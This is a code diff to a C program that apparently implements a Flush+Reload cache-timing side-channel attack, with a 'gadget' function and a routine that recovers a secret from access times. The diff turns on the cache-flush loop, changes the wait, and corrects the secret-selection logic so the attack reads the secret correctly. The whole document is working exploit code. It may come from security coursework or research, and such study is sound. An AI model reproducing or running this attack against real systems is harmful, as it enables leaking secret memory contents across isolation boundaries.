@@ -24,13 +24,14 @@ void gadget() {
 }
 
 void flushAndReload(int* timer){
-	// flush all the entries of the array out of cache
-	// for(int i=lowerBound; i<=upperBound; i++){
-	// 	clflush((void*)(&array[i*offset]));
-	// }
+	//flush all the entries of the array out of cache
+	for(int i=lowerBound; i<=upperBound; i++){
+		clflush((void*)(&array[i*offset]));
+	}
 	// wait some time for the attack to happen
 	// sleep(sleepTime);
-	sched_yield();
+	//sched_yield();
+	sleep(5);
 	// _mm_pause();
 	// for(int i=lowerBound; i<=upperBound; i++){
 	// 	// int a = timer[i], b = measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
@@ -38,17 +39,10 @@ void flushAndReload(int* timer){
 	// 	timer[i]+= measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
 	// }
 
-	measure_one_block_access_time(ADDR_PTR(&array[20*offset]));
-	timer[9]+= measure_one_block_access_time(ADDR_PTR(&array[9*offset]));
-	timer[8]+= measure_one_block_access_time(ADDR_PTR(&array[8*offset]));
-	timer[2]+= measure_one_block_access_time(ADDR_PTR(&array[2*offset]));
-	timer[1]+= measure_one_block_access_time(ADDR_PTR(&array[1*offset]));
-	timer[3]+= measure_one_block_access_time(ADDR_PTR(&array[3*offset]));
-	timer[0]+= measure_one_block_access_time(ADDR_PTR(&array[0*offset]));
-	timer[5]+= measure_one_block_access_time(ADDR_PTR(&array[5*offset]));
-	timer[7]+= measure_one_block_access_time(ADDR_PTR(&array[7*offset]));
-	timer[6]+= measure_one_block_access_time(ADDR_PTR(&array[6*offset]));
-	timer[4]+= measure_one_block_access_time(ADDR_PTR(&array[4*offset]));
+	//measure_one_block_access_time(ADDR_PTR(&array[20*offset]))
+	for(int i=lowerBound; i<=upperBound; i++){
+		timer[i]+= measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
+	}
 }
 
 
@@ -63,10 +57,10 @@ int getSecret(int repeat){
 		flushAndReload(timer);
 	}
 
-	int secret = 0, lowestAccessTime = 0;
+	int secret = 0, lowestAccessTime = INT_MAX;
 	for(int i=0; i<=upperBound; i++){
 		printf("%i: %i\n", i, timer[i]/nAttackRepeat);
-		if(timer[i]/nAttackRepeat>lowestAccessTime){
+		if(timer[i]/nAttackRepeat<lowestAccessTime){
 			secret = i;
 			lowestAccessTime = timer[i]/nAttackRepeat;
 		}
